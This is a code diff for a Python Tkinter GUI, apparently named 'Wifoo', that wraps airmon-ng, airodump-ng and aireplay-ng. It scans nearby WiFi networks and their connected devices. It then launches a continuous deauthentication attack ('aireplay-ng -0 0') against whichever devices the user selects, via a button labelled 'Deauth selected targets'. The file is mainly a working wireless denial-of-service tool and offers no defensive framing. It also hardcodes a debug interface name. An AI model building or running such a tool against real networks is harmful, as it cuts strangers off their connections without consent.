@@ -1,30 +1,46 @@
-#!/usr/bin/env python
+from tkinter import *
+from tkinter import ttk
+import tkinter as tk
+from tkinter import messagebox
+
+from PIL import Image,ImageTk
+import time
 import re
 import subprocess
 import tempfile
 import os
+import logging
+import signal
 
 
+
+def put_in_xterm_format(command):
+    return 'xterm -iconic -title shell -geometry 200x24+0+1000 -e "%s"'%command
 
 
 def run_command_in_shell(command_to_run,max_timeout_in_sec):
-    with tempfile.TemporaryFile() as tempf:
-        output=""        
-        proc = subprocess.Popen(command_to_run, stdout=tempf,stderr=tempf,shell=True)
-        try:
-            process_return = proc.wait(timeout=max_timeout_in_sec)
-        except subprocess.TimeoutExpired as e:
-            pass
- 
-        tempf.seek(0)
-        output+=str(tempf.read().decode("utf-8"))
-            
+    print("running command",command_to_run)
+   
+    output=""        
+
+    with open("/tmp/wifoo_out.txt",'w+') as infile:
+        with subprocess.Popen(put_in_xterm_format(command_to_run + " > /tmp/wifoo_out.txt 2>&1"), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, preexec_fn=os.setsid) as process: 
+            try:
+                output = process.communicate(timeout=max_timeout_in_sec)[0]
+            except subprocess.TimeoutExpired:
+                os.killpg(process.pid, signal.SIGKILL)
+                output = process.communicate()[0]
+     
+        infile.seek(0)
+        output = "".join(infile.readlines())
+
     return output
 
 
 
 
-def get_interface_list(output_of_command):
+
+def parse_interface_list(output_of_command):
     ## Takes output of the below command:
     ##   sudo airmon-ng
 
@@ -32,31 +48,38 @@ def get_interface_list(output_of_command):
         
     '''
 
-    Interface	Chipset		Driver
+    PHY	Interface	Driver		Chipset
 
-    wlp3s0		Intel 6205	iwlwifi - [phy0]
-    wlp3s0		Intel 6205	iwlwifi - [phy0]
-    wlp3s0		Intel 6205	iwlwifi - [phy0]
-    wlp3s0		Intel 6205	iwlwifi - [phy0]
+    phy0	wlp3s0		iwlwifi		Intel Corporation Centrino Advanced-N 6205 [Taylor Peak] (rev 34)
+    phy0	wlp3s0		iwlwifi		Intel Corporation Centrino Advanced-N 6205 [Taylor Peak] (rev 34)
+    phy0	wlp3s0		iwlwifi		Intel Corporation Centrino Advanced-N 6205 [Taylor Peak] (rev 34)
 
 
     '''
         
-    text_to_parse = return_of_command
+    text_to_parse = output_of_command
 
     text_to_parse = text_to_parse.splitlines()
 
-    text_to_parse = filter(None, text_to_parse)
+    text_to_parse = list(filter(None, text_to_parse))
+
 
     wifi_cards = text_to_parse[1:]
 
     found_interface_list = list(str())
     for i in wifi_cards:
-        found_interface_list.append(i.split('\t')[0])
+        found_interface_list.append(i.split('\t')[1])
 
     return found_interface_list
 
-def get_monitor_mode_enabled_interface_name(output_of_command):
+
+
+def get_interface_list():
+    return parse_interface_list(run_command_in_shell("airmon-ng",1))
+
+
+
+def parse_monitor_mode_enabled_interface_name(output_of_command):
     ## Takes output of the below command:
     ##  sudo airmon-ng start wlp3s0
 
@@ -64,32 +87,30 @@ def get_monitor_mode_enabled_interface_name(output_of_command):
         
     '''
 
-
-    Found 5 processes that could cause trouble.
+    Found 4 processes that could cause trouble.
     If airodump-ng, aireplay-ng or airtun-ng stops working after
-    a short period of time, you may want to kill (some of) them!
+    a short period of time, you may want to run 'airmon-ng check kill'
 
-    PID	Name
-    879	NetworkManager
-    882	avahi-daemon
-    940	avahi-daemon
-    1032	wpa_supplicant
-    1318	dhclient
-    Process with PID 1318 (dhclient) is running on interface wlp3s0
+    PID Name
+    921 NetworkManager
+    930 avahi-daemon
+    954 avahi-daemon
+    1041 wpa_supplicant
 
+    PHY	Interface	Driver		Chipset
 
-    Interface	Chipset		Driver
+    phy0	wlp3s0		iwlwifi		Intel Corporation Centrino Advanced-N 6205 [Taylor Peak] (rev 34)
 
-    wlp3s0		Intel 6205	iwlwifi - [phy0]
-				(monitor mode enabled on mon0)
+            (mac80211 monitor mode vif enabled for [phy0]wlp3s0 on [phy0]wlp3s0mon)
+            (mac80211 station mode vif disabled for [phy0]wlp3s0)
 
 
     '''
     text_to_parse=output_of_command
+
     match = re.search("\(monitor mode enabled on (.*)\)", text_to_parse)
     if match:
         found_monitor_mode_interface = match.group(1)
-
         return found_monitor_mode_interface
 
     
@@ -97,7 +118,14 @@ def get_monitor_mode_enabled_interface_name(output_of_command):
     
 
 
-def get_routers_and_devices_on_nearby_networks(output_of_command):
+def get_monitor_mode_enabled_interface_using_non_monitor_mode_enabled_interface(interface_to_enable_monitor_mode_on):
+    # enable_monitor_mode_output = run_command_in_shell("airmon-ng start "+interface_to_enable_monitor_mode_on,3)
+    # # return parse_monitor_mode_enabled_interface_name(enable_monitor_mode_output)#TODO: this line can be improved
+
+    # return interface_to_enable_monitor_mode_on+"mon"
+    return "wlp3s0mon"# FOR DEBUG: FIX LATER # uncomment 2 lines above, skip middle one
+
+def parse_routers_and_devices_on_nearby_networks(output_of_command):
     ## Takes output of the below command:
     ##  sudo airodump-ng mon0
     all_found_routers = list()
@@ -105,7 +133,7 @@ def get_routers_and_devices_on_nearby_networks(output_of_command):
 
     ##output should be similar to this:
 
-    text_to_parse = '''
+    '''
 
 
 
@@ -163,18 +191,34 @@ def get_routers_and_devices_on_nearby_networks(output_of_command):
 
     '''
 
+    text_to_parse = output_of_command
 
+
+
+    matches = tuple(re.finditer(r"\[J\[1;1H", text_to_parse,re.MULTILINE|re.DOTALL))
+
+    text_to_parse = text_to_parse[matches[-2].start() : matches[-1].start()]
+
+
+
+    
     match = re.search(r"BSSID\s*PWR\s*Beacons\s*#Data,\s*#/s\s*CH\s*MB\s*ENC\s*CIPHER\s*AUTH\s*ESSID\s*(.*)BSSID\s*STATION\s*PWR\s*Rate\s*Lost\s*Frames\s*Probe(.*)", text_to_parse,re.MULTILINE|re.DOTALL)
+
     if match:
-        found_routers_info = match.group(1).split('\n')
-        found_devices_info = match.group(2).split('\n')
+        if match.group(1):
+            found_routers_info = match.group(1).split('\n')
+
+        if match.group(2):
+            found_devices_info = match.group(2).split('\n')
+
+
 
 
 
         for router_info in found_routers_info:
             
                 router_info = router_info.split(" ")
-                router_info = filter(None, router_info)
+                router_info = list(filter(None, router_info))
                 if len(router_info) > 0:
                     
 ##                    KEEP THIS FOR REFERENCE
@@ -197,7 +241,7 @@ def get_routers_and_devices_on_nearby_networks(output_of_command):
         for device_info in found_devices_info:
             
                 device_info = device_info.split(" ")
-                device_info = filter(None, device_info)
+                device_info = list(filter(None, device_info))
                 if len(device_info) > 0:
                     
 ##                    KEEP THIS FOR REFERENCE
@@ -217,18 +261,277 @@ def get_routers_and_devices_on_nearby_networks(output_of_command):
             
     return all_found_routers,all_found_devices
 
+def get_routers_and_devices_on_nearby_networks(monitor_mode_enabled_interface):
+
+    return parse_routers_and_devices_on_nearby_networks(run_command_in_shell("airodump-ng "+monitor_mode_enabled_interface,10))
 
 
 
-get_devices_on_nearby_networks("")
+class GetRoutersAndDevices:
+    def __init__(self, master,chosen_non_monitor_mode_enabled_interface):
+        self.master = master
+        master.title("Routers and devices")
+
+        self.monitor_mode_enabled_interface = get_monitor_mode_enabled_interface_using_non_monitor_mode_enabled_interface(chosen_non_monitor_mode_enabled_interface)
+        self.all_routers,self.all_devices = get_routers_and_devices_on_nearby_networks(self.monitor_mode_enabled_interface)
+
+        self.wifi_listbox = Listbox(self.master)
+        self.choose_devices_listbox = Listbox(self.master,selectmode='multiple')
+        selected_devices_indexes=list()
+
+
+        self.master.geometry("500x400")
+        choose_wifi = Label(self.master, text='Choose Wifi: ',anchor='nw')   
+        choose_wifi.pack()
+
+
+
+        self.wifi_listbox.bind('<<ListboxSelect>>',self.cursor_event_choose_wifi_listbox)
+        self.wifi_listbox.pack(fill=BOTH)
+        for item in self.all_routers:
+            self.wifi_listbox.insert(END, item)
+            
+
+
+
+        self.block_everyone_button = Button(self.master, text="Deauth selected targets for 15 seconds", bg='red', command=self.block_selected_devices)
+        self.block_everyone_button.pack(side=BOTTOM, fill=X)
+
+
+        choose_devices = Label(self.master, text='Choose Devices: ',anchor='nw')   
+        choose_devices.pack()
+
+
+        self.choose_devices_listbox.bind('<<ListboxSelect>>',self.cursor_event_choose_devices_listbox)
+        self.choose_devices_listbox.pack(fill=BOTH)
 
 
 
 
 
+
+    def cursor_event_choose_wifi_listbox(self,event):
+        if len(self.wifi_listbox.curselection()) > 0:
+            self.router_selected = self.all_routers[self.wifi_listbox.curselection()[0]]
+            self.choose_devices_listbox.delete(0,END)
+            for item in self.get_devices_connected_to_router(self.router_selected[0], self.all_devices):
+                self.choose_devices_listbox.insert(END, item)
+
+
+
+    def cursor_event_choose_devices_listbox(self,event):
+        self.selected_devices_indexes = self.choose_devices_listbox.curselection()
+        
+
+        
+
+    def block_selected_devices(self):
+        selected_devices_macs = []
+        selected_ap_mac = self.router_selected[0]
+
+        for i in self.selected_devices_indexes:
+            self.choose_devices_listbox.itemconfig(i,bg='red')
+
+            selected_devices_macs.append(self.get_devices_connected_to_router(selected_ap_mac, self.all_devices)[i][1])
+            
+
+
+
+        if selected_devices_macs != []:
+            
+            selected_ap_channel = self.router_selected[5]
+
+            client_mac_params = " -c ".join(selected_devices_macs)
+
+
+
+            lock_channel_command = "airodump-ng -c %s %s"%(selected_ap_channel,self.monitor_mode_enabled_interface)
+            final_command = "aireplay-ng -0 0 -a %s -c %s %s"%(selected_ap_mac,client_mac_params,self.monitor_mode_enabled_interface)
+
+
+            print('final_command',final_command)
+
+            print('run_command_in_shell(lock_channel_command)',run_command_in_shell(lock_channel_command,3))
+
+
+            print('run_command_in_shell(final_command)',run_command_in_shell(final_command,15))
+
+        
+
+            self.choose_devices_listbox.selection_clear(0,END)
+
+
+        else:
+            tk.messagebox.showinfo("Device not selected", "Please select devices to block")
+
+
+        
+        pass
+
+
+    def permit_selected_devices(self):
+        pass
+
+    def get_devices_connected_to_router(self,router,all_devices):
+        current_router_devices = list()
+        for device in all_devices:
+            if router == device[0]:
+                current_router_devices.append(device)
+
+        return current_router_devices
+
+
+
+
+
+        
+        
+
+
+
+class ChooseInterface:
+    def __init__(self, master):
+        choose_interface_class = self
+        
+        self.master = master
+        master.title("Choose interface")
+
+
+        w = 180
+        h = 100 
+
+        ws = master.winfo_screenwidth() 
+        hs = master.winfo_screenheight()
+
+        x = (ws/2) - (w/2)
+        y = (hs/2) - (h/2)
+
+        self.master.geometry('%dx%d+%d+%d' % (w, h, x, y))
+
+
+
+
+
+        self.label = Label(self.master, text="Select which interface to \nenable monitor mode on: ")
+        self.label.grid(row=1, column=2)
+
+        found_interfaces_list = get_interface_list()
+        
+        self.cbox = ttk.Combobox(self.master)
+        self.cbox.grid(row=2, column=2)
+        self.cbox['values']=found_interfaces_list
+        self.cbox.current(0)
+
+
+
+        
+
+        self.nextbtn = tk.Button(self.master,text = "Next",command = lambda:self.start_enable_monitor_mode_gui(choose_interface_class.cbox.get()))
+        self.nextbtn.grid(row=3, column=2)
+
+
+        
+        
+        
+
+    def start_enable_monitor_mode_gui(self,chosen_non_monitor_mode_enabled_interface):
+        self.master.destroy()
+
+        self.newWindow = Tk()
+        self.app = GetRoutersAndDevices(self.newWindow,chosen_non_monitor_mode_enabled_interface)
+
+
+
+class SplashScreen(Frame):
+    def __init__(self, master):
+        start = time.time()
+
+
+
+        Frame.__init__(self, master,bg='#ffffff')
+        self.grid()
+
+        
+        
+
+        # get screen width and height
+        ws = self.master.winfo_screenwidth()
+        hs = self.master.winfo_screenheight()
+        w = 500
+        h = 300
+        # calculate position x, y
+        x = (ws/2) - (w/2) 
+        y = (hs/2) - (h/2)
+        self.master.geometry('%dx%d+%d+%d' % (w, h, x, y))
+        
+        self.master.overrideredirect(True)
+        self.lift()
+
+
+
+
+
+        canvas = Canvas(self,width=w, height=h,bg='#ffffff')
+
+
+        # load the .gif image file
+        gif1 = PhotoImage(file="version1.gif")
+
+        # put gif image on canvas
+        # pic's upper left corner (NW) on the canvas is at x=50 y=10
+        canvas.create_image((0, 0), image=gif1, anchor=NW)
+        canvas.image = gif1
+
+        canvas.grid()
+
+
+        self.label = Label(master, text="Wifoo: version 1.0")
+        self.label.grid(row=0, column=0,sticky='se')
+        self.label.config(bg="#ffffff")
+
+        
+        self.update()
+
+
+        while True:
+            if time.time() - start > 2:#todo: change this into 2 later
+                self.start_choose_interface(None)
+                break
+
+        
+
+
+    def start_choose_interface(self,event):
+        self.master.destroy()
+
+        self.newWindow = Tk()
+        
+        self.app = ChooseInterface(self.newWindow)
+        
+        
+          
+        
+
+
+def main():
+    root = Tk()
+    root.config(bg="#ffffff")
+
+    if os.getuid() == 0:
+        app = SplashScreen(root)
+        root.mainloop()
+    else:
+        root.withdraw()
+        tk.messagebox.showinfo("I NEED ROOOOOT!!!!!!!!!", "This app needs to be run as root.")
+
+    
 
 
     
 
 
-        
+
+if __name__ == '__main__':
+    main()
+
+
